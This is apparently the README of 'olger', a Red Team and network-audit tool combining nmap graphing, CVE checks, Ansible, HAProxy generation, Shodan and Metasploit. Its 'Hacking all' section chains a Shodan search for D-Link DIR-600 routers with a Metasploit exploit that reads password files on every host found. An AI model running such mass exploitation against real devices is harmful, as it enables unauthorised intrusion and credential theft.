## What olger does

[![Codacy Badge](https://api.codacy.com/project/badge/Grade/5b1d47ad05d44dfaad273514f6aeedaf)](https://app.codacy.com/manual/pedroelbanquero/olger?utm_source=github.com&utm_medium=referral&utm_content=pedroelbanquero/olger&utm_campaign=Badge_Grade_Settings)

Olger Nmap D3.js data visualizer with CVE check and ansible inventories smart generation.

Local python webserver for graph visualization with D3.js .

Uses www.cvdetails.com to identify Cyber Security Vulnerabilities .

Sends data to elasticsearch and visualizes in kibana .

Ansible inventory generation, group inventory per software type

Graphviz export, export pdf and .dot files

Shodan api

Generates HAPROXY configs for protect big networks

Metasploit integration

Ansible playbooks

## Why

Because we are tired and we not want to work, we have created olger, for those who have to create infinite inventories in giant infrastructures and have controlled the safety of the machines, from launching a patch to installing and hardening servers or HAP balancers. Make pretty security scans and reports doing nothing.

In the most of the big infrastructures they have a lot of internal services to manage his infrastructures, for do that , normally nobody thinks in the security, you can ping to your neighbors, scan them, a lot of trafic aren't encrypted, a lot s passwords in plain ...

The timing to repair or modify things is extremlly bureaucratized, and normally is by hand going to the machines and making the changes, we want to work less , this is the reason for olger, keep your organization controlled in security terms, repair fast and in a easy way, and keep your network isolated. 


## Please don't use for bad things

The information collected with this tool can be illegal in some countries, sometimes can expose big infrastructures to a dangerous consequences if you publish something, take care on that, this tool sends non malicious packets around the network to check connectivity and other cybersecurity issues. Can be used for bad things, please don't do that



## Install the tools

Execute command:

```bash
git clone https://github.com/pedroelbanquero/olger.git

cd olger


chmod +x ./install


./install


```

## Usage


```bash



Usage: ./olger [OPTION ...] [foo] [bar]

Olger a Red Team tool with ansible playbooks to repair things , D3.js Graph visualization, metasploit, shodan, kibana and elasticsearch.

Options:

-h, --help          display this usage message and exit

-n, --genfromnmap  [RANGE] [MISSION]     delete things

-f, --genfromfile [FILE] generate a graph from nmap xml file

-s, --genfromshodan [QUERY] write output to file

-m, --msfconsole [EXPLOIT_CHECK] [PAYLOAD] [CMD] [LIST] execute msf command for each input in the list

-r, --report [MISSION] write output to file in pdf and dot format

-p, --hapgen [DATAFILE] Generate haproxy configuration

-q, --query [DIR] [QUERY] make querys over raw json or csv data (not ready)

-a, --ansible [INVENTORY] [PLAYBOOK] Execture ansible playbooks

-l, --ansible-list playbooks , List all available playbooks


```

## How to plot a network graph with nmap

Execute command:


```bash
cd olger

chmod +x olger (first time only)

./olger -n 192.168.0.1-255 name-mission

```


Outputs:

  - cvedetails.cve , a csv format with vulneravilities in the network
  - web/graphs/data.json, a compatible D3.js json graph data format
  - reports/reportNameMission.txt, a plaint text data report in txt format
  - web server in port 8000, serving D3.js interactive graph
  - elasticsearch with tls push
 
 
 
 
## How to dump a workless security report

Execute command:


```bash

cd olger

chmod +x olger (Just first time)

./olger -r ./web/graphs/data.json name-mission


```


Outputs:

  - reports/nameMission/namemission.pdf
  - reports/nameMission/namemission.dot
  
  
## Configure elastic search to visualize data in kibana

Install elastic search and kibana

```

./scripts/install_elk.sh

./scripts/setup_certs_elk.sh yourdomaindotcomorlocaldomain


```


Edit scripts/olger_lib.py

Change the auth parameters in the file, elastic and authkey and the url of your elastic service, for example https://yourdomain.com:9200 , remember use tls encryption in your server to prevent expose data in the network.

```

def elkpush(indexdat,jsondat):

        es = Elasticsearch(
                ['host.domain'],
                scheme="https",
                verify_certs=False,
                http_auth=('elastic', 'auth-key'),
		port=9200
	)
	print(es.index(index=indexdat,doc_type="security_report", body=json.dumps(jsondat)))



```

Uncomment line 225 (remove #)

````
 #print(elkpush("box_"+sys.argv[2],toelastic))
 
````

Import dashboard file network_devices.ndjson in your kibana.



    Go to Kibana
    Click on Management
    Click on Saved Objects
    Click on the Import button
    Browse the exported file
    You will then be prompted: "If any of the objects already exist, do you want to automatically overwrite them?" and you will be given the following options:
        No, prompt me for each one
        Yes, overwrite all


## Generate HAPROXY configuration

The motivation to do this after scan a network is make simple the network hardening any where, cut all connections between devices and redirect all trafic to de haproxy, this keeps the network splited and prevents comunications between devices, redirecting all network services in a central point, balanced to higth disponibility . Solve a lot of problems, and encrypt all the network with the minium deployment in the infrastructure, works in parallel while people is testing and one time is ready with a simple ip table rules , the entire network is isolated



````

olger -p data/internal_services.csv

````

Outputs:

  - data/haproxy.conf
  

Csv file format

iphaproxy,domainname,http,ipbackend,portbackend,urlredirect


## Configure and use shodan

Edit scripts/shodan.js

Add your api key

````

var client = new ShodanClient({ key: '' });

````


Execution

````

./olger -s "your search here"


````

Outputs:

  - lists/query , a ip:port list to automathize tasks


## Metasploit module

Just a line with the exploit to use, the payload, the command and the list to apply each metasploit command. Be carefully and don't use if you don't know how or for bad purposes.

-m, --msfconsole [EXPLOIT_CHECK] [PAYLOAD] [CMD] [LIST] execute msf command for each input in the list

````

./olger -m exploits/dlink "" "cat /var/passwd" "lists/dir600v2.12

````


## Hacking all with olger

Is just an example never do in real world

Getting shells anywhere or execute commands in remote hosts.


```

./olger -s "dir 600 v2.12"

./olger -m exploits/dlink "" "cat /var/passwd" "lists/dir600v2.12


```


This example search all dlink routers in the world and show his remote administrator password (Not do if you aren't the owner of the devices or you have permit)


Please don't use for deploy botnets, hack corporations or goverments.


## Cron Jobs

Add any line to cronjobs file /etc/crontab for scheduled tasks 

````

0 2 * * * /olgerfolder/olger -n 192.168.0.1-255

````
Example to execute task all days at 2 am
## How it looks

Explore the network with browser view and D3.js Graph

![image olger graph d3 js](img/olger.png)


Make a plain text report with cvdetails connection

![image olger report vulnerabilities CVE](img/report.png)


Export pretty report to PDF and DOT files.

![image olger report vulnerabilities CVE](img/pdfgraphd3.png)



Send data to elastic search and import our Dashboard in KIBANA

![image olger relastic search and kibana](img/kibana2.png)
![image olger relastic search and kibana](img/kibana3.png)

# Acknowledgment

My most sincere gratitude and recognition to Olger T., who has taught me about cybersecurity these months.

My most sincere gratitude and recognition to Angel L. and his cybersecurity company, who allow me to join to this world


## License and rights

Just you can use for non proffit activities, never for commercial use, distribution part of the content for comercial purposes or make any kind of proffit are forbbiden,

Talk with the authors for that.

